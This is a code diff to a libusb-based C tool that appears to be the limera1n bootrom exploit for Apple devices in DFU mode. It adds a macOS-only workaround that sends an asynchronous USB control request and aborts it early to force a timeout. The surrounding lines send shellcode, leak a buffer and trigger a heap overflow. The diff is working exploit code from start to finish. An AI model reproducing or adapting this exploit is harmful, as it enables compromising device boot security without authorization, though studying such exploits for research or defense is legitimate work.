@@ -9,6 +9,9 @@
 #include <string.h>
 #include <stdlib.h>
 #include <libusb-1.0/libusb.h>
+#ifdef __APPLE__
+#include "darwin_usb.h"
+#endif
 
 #define LOADADDR	0x84000000
 // A4:
@@ -24,6 +27,10 @@
 #define VENDOR_ID    0x05AC
 #define WTF_MODE     0x1227
 #define BUF_SIZE     0x10000
+
+#ifdef __APPLE__
+	void dummy_callback() { }
+#endif
 
 struct libusb_device_handle *usb_init(struct libusb_context* context, int devid) {
 	struct libusb_device **device_list;
@@ -139,7 +146,27 @@ int main(int argc, char *argv[]) {
 	printf("sent shellcode: %X has real length %X\n", libusb_control_transfer(handle, 0x21, 1, 0, 0, (unsigned char*) shellcode, 0x800, 1000), shellcode_length);
 	memset(buf, 0xBB, 0x800);
 	printf("never freed: %X\n", libusb_control_transfer(handle, 0xA1, 1, 0, 0, buf, 0x800, 1000));
+	
+	#ifndef __APPLE__
 	printf("sent fake data to timeout: %X\n", libusb_control_transfer(handle, 0x21, 1, 0, 0, buf, 0x800, 10));
+	#else
+	// pod2g: dirty hack for limera1n support.
+	IOReturn kresult;
+	IOUSBDevRequest req;
+	bzero(&req, sizeof(req));
+	//struct darwin_device_handle_priv *priv = (struct darwin_device_handle_priv *)client->handle->os_priv;
+	struct darwin_device_priv *dpriv = (struct darwin_device_priv *)handle->dev->os_priv;
+	req.bmRequestType     = 0x21;
+	req.bRequest          = 1;
+	req.wValue            = OSSwapLittleToHostInt16 (0);
+	req.wIndex            = OSSwapLittleToHostInt16 (0);
+	req.wLength           = OSSwapLittleToHostInt16 (0x800);
+	req.pData             = buf + LIBUSB_CONTROL_SETUP_SIZE;
+	kresult = (*(dpriv->device))->DeviceRequestAsync(dpriv->device, &req, (IOAsyncCallback1) dummy_callback, NULL);
+	usleep(5 * 1000);
+	kresult = (*(dpriv->device))->USBDeviceAbortPipeZero (dpriv->device);
+	#endif
+	
 	printf("sent exploit to heap overflow: %X\n", libusb_control_transfer(handle, 0x21, 2, 0, 0, buf, 0, 1000));
 	libusb_reset_device(handle);
 	dfu_notify_upload_finshed(handle);
